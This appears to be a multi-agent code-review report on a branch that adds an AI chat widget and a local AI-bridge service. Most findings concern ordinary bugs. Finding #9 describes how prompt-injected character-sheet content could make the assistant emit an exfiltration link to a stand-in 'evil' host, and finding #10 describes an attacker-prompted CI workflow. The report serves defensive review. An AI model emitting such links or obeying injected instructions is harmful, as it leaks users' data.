# 🔍 QA Team Review Report

| Key                 | Value |
| ------------------- | ----- |
| **Branch**          | `feat/ai-chat-bridge` |
| **Base**            | `master` |
| **Files changed**   | 97 |
| **Agents deployed** | 🔒 security · 🔄 reliability · ⚡ performance · 🎨 frontend · 🔗 compatibility · 📊 data-integrity · ✏️ copy · 🧑‍💻 generalist-a · 🕵️ generalist-b |
| **Date**            | 2026-07-16 |

---

## 📋 Summary

- 🤖 Adds the **AI Chat widget** + optional local **AI-bridge service** (Claude Agent SDK + ddb-mcp, SSE on `localhost:38900`) with a shared types-only wire contract (`packages/bridge-protocol`)
- 💾 New persisted stores (`dm-ai-chat-v1`, `dm-portal-url-v1`) wired into backup/restore with validators and byte/count caps
- ⚔️ Unifies the four "add to initiative" paths behind one rule (`decideInitiativeAdd`) with a duplicate-PC warning; Bestiary result capping; Portal embed widget; CI workflows
- ✅ Every agent independently noted the branch is **unusually disciplined** — layered timeouts, three-layer tool gating, validated untrusted bytes, confirm-gated destructive actions, regression tests

### Key findings

- 🟠 **3-agent convergence:** a wedged SDK turn that ignores abort pins the single `/chat` slot forever → total chat outage while `/health` stays green (🔄⚡🕵️)
- 🟠 **3-agent convergence:** two AI Chat tiles silently clobber each other's persisted transcript — last debounced write wins (🎨🧑‍💻🕵️)
- 🟡 **3-agent convergence:** the friendly turn-timeout message is unreachable in production (`agent.ts` swallows the abort into an `error` event); the test mock diverges from the real generator contract (🔄🧑‍💻🕵️)
- 🟡 **2-agent convergence:** model-authored `https://` links are the one residual prompt-injection exfiltration channel (🔒🕵️)
- 🟡 Streaming re-renders the whole unmemoized transcript per SSE chunk — jank scales with transcript size up to 200 msgs / 900 KB (⚡)
- 🟡 Light-mode contrast remap misses the new red/emerald status text — error/success messages near-invisible on white (🎨)
- 🟡 Documented remote-origin deploy is blocked by browser private-network/mixed-content gates and misreported as "bridge offline" (🔗)
- 🟡 Monster generator exact-name cross-source matches bypass the CR/type gate → wrong bundled stat blocks served silently (📊)

---

## 🏁 Verdict

> 💬 **APPROVE WITH NITS**

No agent found anything critical or remotely exploitable; six of nine rated MEDIUM on fixable, well-bounded issues. Recommended before merge: the two 🟠 items (turn-slot reclamation hard fallback; duplicate AI Chat tile guard) — both are small fixes with data-loss/outage blast radius.

---

## 👥 Agent summaries

| Agent | Risk | Summary |
| ----- | ---- | ------- |
| 🔒 security | 🟢 LOW | Network posture, tool containment, credential scrubbing, and supply-chain pinning all deliberate and solid. Nits: unvalidated `resume`/`model` passthrough; model-authored link exfil channel; optional `@claude` workflow author gate. |
| 🔄 reliability | 🟡 MEDIUM | Layered timeouts and end-to-end cancellation are excellent, but slot reclamation is cooperative-only: a non-cooperative SDK hang pins the single turn slot permanently; the timeout's friendly message is dead code in production. |
| ⚡ performance | 🟡 MEDIUM | Bridge resource safety is strong; the gap is the chat render path — per-chunk `setState` with zero memoization makes streaming cost scale with total transcript size. `React.memo` on a message row fixes it cheaply. |
| 🎨 frontend | 🟡 MEDIUM | Failure-mode UX is textbook, but escalation retry leaves stale error/partial content under a successful answer, and the new red/emerald status text was missed by the branch's own light-mode contrast remap. |
| 🔗 compatibility | 🟡 MEDIUM | Wire contract, skew tolerance, and Docker/CI coordination are exemplary. The documented remote-origin deploy fails on browser private-network gates the bridge doesn't handle, and the widget misdiagnoses it as "offline". |
| 📊 data-integrity | 🟢 LOW | New stores ship with shared read/import validators, caps sized under backup limits, and atomic import. One MEDIUM: generator exact-name cross-source matches can silently ship the wrong monster's stat block. |
| ✏️ copy | 🟢 LOW | Error copy is unusually actionable. Advisory nits: picker description contradicts the "works without the bridge" story; storage-full banner asserts a cause it can't know; raw SDK subtypes and backticks leak into user-facing text. |
| 🧑‍💻 generalist-a | 🟡 MEDIUM | Commits match the code; concurrency handling is visibly reasoned. Flags the unreachable timeout message (test mock diverges from production contract) and the dual-tile transcript clobber. |
| 🕵️ generalist-b | 🟡 MEDIUM | Could not break CORS/CSRF, Portal canonicalization, or the storage validators. Risk clusters in `/chat` availability (slot pinning, unhandled-rejection edge), the ungated `@claude` workflow, and the link exfil channel. |

**Note:** ✏️ copy findings are always non-blocking nits. 🧑‍💻 generalist-a and 🕵️ generalist-b are independent generalist reviewers used for convergence validation — their findings carry extra weight when they independently match a specialist's finding.

Risk emojis: 🔴 CRITICAL, 🟠 HIGH, 🟡 MEDIUM, 🟢 LOW, ⚪ NONE

---

## 📝 Findings

| #  | Status  | Priority | Finding | Location | Agents | Reasoning | Suggested fix |
| -- | ------- | -------- | ------- | -------- | ------ | --------- | ------------- |
| 1  | ✅ Fixed | 🟠 High | Wedged turn pins the single `/chat` slot forever | `services/ai-bridge/src/server.ts:221` | 🔄⚡🕵️ (convergent ×3) | Slot release relies on the aborted SDK generator settling; a hang that ignores abort (the exact case the timeout exists for) → permanent 429s while `/health` reports ok. Also: `inFlightTurns++` sits outside the `try`, and `void handleChat(...)` makes a stray rejection a process-killing unhandled rejection. | **Fixed:** each `next()` races a wedge deadline (`WEDGE_GRACE_MS` after abort) so an unresponsive generator is abandoned and the slot reclaimed; slot decrement is a once-guarded `releaseSlot()` in a `finally` that everything after the claim runs under; the `/chat` route now `.catch`es the handler (500 or destroy). Regression test: "reclaims the slot even when the turn ignores the abort entirely". |
| 2  | ✅ Fixed | 🟠 High | Two AI Chat tiles silently clobber the persisted transcript | `AIChatWidget.tsx:215` / `WidgetSelectorModal.tsx` | 🎨🧑‍💻🕵️ (convergent ×3) | Each mount holds an independent copy of `dm-ai-chat-v1` with debounced whole-array writes — last writer wins, silently erasing the other tile's messages; second tile's sends also 429. | **Fixed (both layers):** module-level mount slot (`src/lib/singletonWidget.ts`) — a duplicate mount renders an "already open" placeholder instead of a second live transcript, and takes over when the owner unmounts (covers backup-restored/hand-edited tiles); plus placement-time guards — the selector renders an already-placed AI Chat disabled, and the recent-widgets restore retires a stale chip instead of duplicating (`SINGLETON_WIDGET_TYPES` in types.ts, wired in App.tsx). Tests: `singletonWidget.test.ts` + `AIChatWidget.singleton.test.tsx`. |
| 3  | ✅ Fixed | 🟡 Medium | Turn-timeout message unreachable; test mock diverges from production | `agent.ts:195` / `server.ts:227` / `server.test.ts:319` | 🔄🧑‍💻🕵️ (convergent ×3) | `runChatTurn` converts the timeout abort into a yielded `error` event, so `handleChat`'s `timedOut` branch never runs; DM sees a raw "operation was aborted" and the widget drops the session id. The test passes only because its mock rethrows. | **Fixed:** `runChatTurn` now rethrows when its abort signal has fired (detected via the signal, not the error shape), so `handleChat`'s catch owns the wording — friendly time-limit message on timeout, silence on client disconnect. Contract pinned in `agent.test.ts` ("runChatTurn abort/error contract"); the server-test mock now matches production. |
| 4  | ✅ Fixed | 🟡 Medium | Streaming re-renders whole unmemoized transcript per SSE chunk | `AIChatWidget.tsx:657` / `miniMarkdown.tsx:166` | ⚡ | Per-chunk cost scales with transcript size (up to 200 msgs / 900 KB); completed messages re-tokenize on every chunk; streaming message re-parses O(n²). Jank appears exactly in long real sessions. | **Fixed:** transcript rows extracted into a `React.memo` `MessageRow` (the per-row escalate closure moved inside it so parent props stay memo-friendly) — per-chunk renders now touch only the streaming row; plus a bounded string-keyed inline-token cache in `miniMarkdown.tsx` so the streaming message's completed lines don't re-tokenize per chunk. |
| 5  | ✅ Fixed | 🟡 Medium | Escalation retry leaves stale error/partial content under a successful answer | `AIChatWidget.tsx:577` | 🎨 | `escalate()` doesn't reset `error`/`text`/`tools`; a retry after bridge recovery renders success with the old error banner, flips `escalated` back, and can duplicate partial content. | **Fixed:** the optimistic update now resets every bridge-answer field (`error: undefined, text: "", tools: [], cards: [], toolErrors: []`); the local answer being escalated is untouched. |
| 6  | ✅ Fixed | 🟡 Medium | Light-mode contrast remap misses red/emerald status text | `index.css:229` | 🎨 | `text-red-400` errors (~3:1) and `text-emerald-400/90` success flashes (~1.8:1) on white are below AA — errors/click feedback effectively invisible in light mode. | **Fixed:** remap block extended mirroring the amber/cyan pattern — red-300/90, red-400, red-400/90, red-500 → `#b91c1c`; emerald-400, emerald-400/90, emerald-500 → `#047857`. Bare `text-red-300`/`text-emerald-300` deliberately excluded: they only appear on dark chip backgrounds the light theme keeps dark. |
| 7  | ✅ Fixed | 🟡 Medium | Remote-origin deploys blocked by browser PNA/mixed-content, misreported as offline | `server.ts:246` / `config.ts:26` | 🔗 | Public/https origin → `http://127.0.0.1` fetch hits Chromium private-network gates (no `Access-Control-Allow-Private-Network`) or Safari mixed-content; widget shows "offline" with a wrong remedy. Works in every tested localhost config, fails only in the documented reverse-proxy deploy. | **Fixed:** the OPTIONS handler answers a `Access-Control-Request-Private-Network: true` preflight with `Access-Control-Allow-Private-Network: true` for allowlisted origins only (regression test in `server.test.ts`); README gained a "Serving the SPA from a remote origin" section covering the Chromium PNA and Safari mixed-content gates (the latter has no bridge-side fix). |
| 8  | ✅ Fixed | 🟡 Medium | Generator exact-name cross-source matches bypass the CR/type gate | `generate-monsters.ts` (`loadRichByName` bulk loop) | 📊 | A third-party CSV row that name-collides with an official WotC monster silently gets the wrong stat block, served in bundled data indefinitely; only an aggregate count is logged. | **Fixed:** exact-name matches whose CSV source maps to an Open5e book are now gated on `richMatchesCsv` (CR + base-type agreement) and per-entry logged, same as lossy matches; a gated skip stays thin for the Open5e pass to fill from the row's own source book. |
| 9  | ✅ Fixed | 🟡 Medium | Model-authored `https://` links are an open exfiltration channel | `miniMarkdown.tsx:139` | 🔒🕵️ (convergent ×2) | Prompt-injected D&D Beyond content (player-authored sheets, homebrew) can make Selene emit `[text](https://evil?d=<data>)`; the read-only tool gate closes every other exfil path, and the anchor shows only the link text. | **Fixed:** every rendered http(s) link now shows its destination host beside the anchor text (muted `(host)` suffix) unless the visible text already names the host; mailto/relative hrefs are exempt. `linkHost` is exported and unit-tested. |
| 10 | ✅ Fixed | 🟡 Medium | `@claude` workflow triggerable by any commenter | `.github/workflows/claude.yml:15` | 🔒🕵️ (convergent ×2, severity diverged) | On a public repo, strangers can drive a job holding `CLAUDE_CODE_OAUTH_TOKEN` (subscription spend, attacker-controlled prompt). Mitigations exist (read-only perms, SHA-pinned action, action-side actor check) — 🔒 rates it acceptable, 🕵️ wants the gate. | **Fixed:** every trigger arm of the job `if:` now also requires the author's `author_association` to be `OWNER`/`MEMBER`/`COLLABORATOR`, as defense-in-depth on top of the action-side actor check. |
| 11 | ⬜ Open | 🟢 Low | Hardcoded dated model IDs in a SW-precached bundle | `AIChatWidget.tsx:34-45` | 🔗🧑‍💻 (convergent ×2) | A retired ID fails every turn from a cached SPA with no fallback; `model` is always sent so the SDK default is unreachable. | Add a "Default" picker option that omits `model` (protocol already supports it); prefer alias IDs. |
| 12 | ⬜ Open | 🟢 Low | Bestiary `totalResults` undercounts; literal `200` duplicates `MAX_RESULTS` | `BestiaryWidget.tsx:385,484` | 🧑‍💻🕵️ (convergent ×2) | Thin-entry scan breaks at 200 hits, so "of N" is a floor presented as a total; the hardcoded literal can drift from the constant. | Count all matches while collecting only 200 (or label "200+"); use `MAX_RESULTS`. |
| 13 | ⬜ Open | 🟢 Low | `KEY_LABELS` missing `dm-ai-chat-v1` | `Sidebar.tsx:22-41` | 📊✏️ (convergent ×2) | A skipped transcript in the import confirm shows as raw-ish "ai-chat" amid friendly labels, at the moment trust matters most. | Add `"dm-ai-chat-v1": "AI Chat"`. |
| 14 | ⬜ Open | 🟢 Low | `turnTimeoutMs` trusted stale and unbounded | `aiBridge.ts:296` / `AIChatWidget.tsx:446` | 🔗🕵️ (convergent ×2, different aspects) | Watchdog sizes from a mount-time `/health` snapshot (stale after a bridge restart with a raised cap) and has no upper clamp (a garbage value disables the watchdog entirely). | Re-probe `/health` at turn start; clamp the cap (e.g. 30 min) before adding margin. |
| 15 | ⬜ Open | 🟢 Low | `resume`/`model` forwarded to the SDK unvalidated | `chatRequest.ts:37` | 🔒 | The one `/chat` field reaching a filesystem-adjacent lookup inside the SDK; `effort` is enum-validated, these aren't. | Constrain `resume` to `/^[A-Za-z0-9-]{1,64}$/`, `model` to `/^[a-z0-9.-]+$/i`. |
| 16 | ⬜ Open | 🟢 Low | No size cap on a single tool-result card's markdown | `toolResults.ts` / `chatHistory.ts:89` | 🔄 | One oversized card (e.g. `ddb_read_book`) can push the stored value past the 900 KB budget and past backup's 1 MB per-value cap — exports fine, silently skipped on restore. | Truncate card markdown at the bridge (64–128 KB + marker); clamp an oversized lone newest message in `capChatMessages`. |
| 17 | ⬜ Open | 🟢 Low | Clean SSE close without `done` presents a truncated answer as complete | `aiBridge.ts` (`streamChat` read loop) | 📊 | A gracefully closed stream resolves normally; partial text renders as a finished answer the DM may act on. | Track whether `done`/`error` arrived; surface "reply may be incomplete" otherwise. |
| 18 | ⬜ Open | 🟢 Low | `envInt` accepts port 0/garbage; diverges from vite.config | `config.ts` | 🕵️ | `AI_BRIDGE_PORT=0` binds an ephemeral port while the SPA bakes `:38900` → permanent "offline" with no error; same var throws in vite.config but silently falls back in the bridge. | Validate `1–65535` and fail startup loudly, matching vite.config. |
| 19 | ⬜ Open | 🟢 Low | `/health` 403 ACAO reflection lets any website fingerprint the bridge | `server.ts:263` | 🕵️ | Drive-by pages can distinguish "bridge up" (readable 403) from "down" (network error) for a service fronting the DM's Claude subscription. | Restrict the 403 reflection to loopback/LAN origins. |
| 20 | ⬜ Open | 🟢 Low | Unparseable card HP silently becomes 0/0 in Initiative | `cardHandoff.ts` (`parseHp`) | 🕵️ | A failed sheet parse renders a PC as downed with no signal that parsing (not the character) is at 0. | Flash a "no HP on card — set manually" note or render a "—" sentinel. |
| 21 | ⬜ Open | 🟢 Low | Mount-time "Connecting…" screen hides the bridge-independent transcript | `AIChatWidget.tsx:607` | 🎨 | A wedged half-open bridge holds the whole widget hostage for the 2.5 s probe though transcript + local lookups don't need it. | Render the chat view immediately with a "connecting…" chip. |
| 22 | ⬜ Open | 🟢 Low | Local `/spell` lookups silently no-op while a turn streams | `AIChatWidget.tsx:529` | 🎨 | `sendingRef` guard over-blocks the bridge-free path with zero feedback. | Route `routeLocal()` before the guard, or show a "wait" hint. |
| 23 | ⬜ Open | 🟢 Low | Portal "Remove link" is unconfirmed and 20 px from Edit | `PortalWidget.tsx:111` | 🎨 | Mis-click destroys a possibly long share URL with no undo — same reasoning that confirm-gated "New chat". | `window.confirm("Remove this link?")` or fold Remove into the edit form. |
| 24 | ⬜ Open | 🟢 Low | Composer textarea never grows; FooterPicker listbox lacks keyboard support | `AIChatWidget.tsx:744,88` | 🎨 | Multi-line prompts scroll invisibly in a 1-row box; ARIA listbox roles promise arrow-key behavior that isn't implemented. | Standard auto-grow capped by `max-h-24`; focus + arrow-key nav in the menu (or drop listbox roles). |
| 25 | ⬜ Open | 🟢 Low | Copy nits (non-blocking) | `WidgetSelectorModal.tsx:66`, `AIChatWidget.tsx:435,735`, `agent.ts:27`, `BestiaryWidget.tsx:484` | ✏️ | Picker says the widget "needs" the bridge (contradicts the works-offline story); storage banner asserts "full" when it may be private-mode; raw SDK subtypes and literal backticks leak into user-visible errors; sibling footers format counts differently. | Reword picker + banner; map subtypes to plain language (mirror `BILLING_LABELS`); drop backticks server-side; `toLocaleString()` both footers. |

Priority mapping: 🔴 Critical — security vulnerability, data loss, or outage risk · 🟠 High — significant bug, fix before merge · 🟡 Medium — should fix, not a blocker · 🟢 Low — nice to have.
